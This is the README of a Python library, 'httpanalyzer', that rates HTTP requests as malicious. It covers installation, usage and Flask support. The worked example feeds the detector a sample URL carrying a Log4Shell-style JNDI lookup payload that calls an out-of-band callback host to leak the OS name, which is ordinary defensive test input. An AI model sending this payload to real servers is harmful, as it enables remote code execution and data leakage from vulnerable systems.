<h1 align="center">httpanalyzer</h1>

<p align="center">
<a href="https://www.python.org/"><img alt="Language" src="https://img.shields.io/badge/Language-Python-blue?style=for-the-badge&logo=python"></a>
<a href="https://mit-license.org/"><img alt="License" src="https://img.shields.io/pypi/l/httpanalyzer?color=blueviolet&style=for-the-badge"></a>
<a href="https://pypi.org/project/httpanalyzer/"><img alt="Version" src="https://img.shields.io/pypi/v/httpanalyzer?label=version&logo=pypi&style=for-the-badge"></a>
<a href="https://github.com/MartinMerkli/httpanalyzer"><img alt="Stars" src="https://img.shields.io/github/stars/martinmerkli/httpanalyzer?color=lightgrey&logo=github&style=for-the-badge"></a>
<a href="https://github.com/MartinMerkli/httpanalyzer/commits/main"><img alt="Commit Activity" src="https://img.shields.io/github/commit-activity/m/martinmerkli/httpanalyzer?color=green&style=for-the-badge"></a>
</p>

This is a python library for analyzing http-request. Useful to reduce unnecessary traffic. 

## License

This project is licensed under the MIT-license. See LICENSE.txt for more information.

## Installing

Make sure pip3 is installed and up to date before executing this command.

```
pip3 install httpanalyzer
```

## Usage

Import the library:

```
import httpanalyzer
```

Create a new request instance:

```
instance = httpanalyzer.Request(http_headers, ip, url, admin_panels)
```

Print the malicious rating:

```
print(instance.malicious())
```

### Example

```
import httpanalyzer

instance = httpanalyzer.Request(
    {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.5',
     'Connection': 'keep-alive',
     'Host': '127.0.0.1:80',
     'User-Agent': 'curl/7.82.0'},
    '159.223.2g05.51',
    '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
    ['wp-content', 'wp-config', 'wp-includes']
)
print(f"Malicious rating: {instance.malicious() * 100}%")
```

### Admin Panels

To reduce the amount of false positives, specify all admin panels you are using. For WordPress this would be `['wp-content', 'wp-config', 'wp-includes']`.

### Flask

httpanalyzer natively supports flask request objects:

```
instance = httpanalyzer.FlaskRequest(flask.request)
```

## Dependencies

Python 3.6 or newer is required. Older versions do not work.
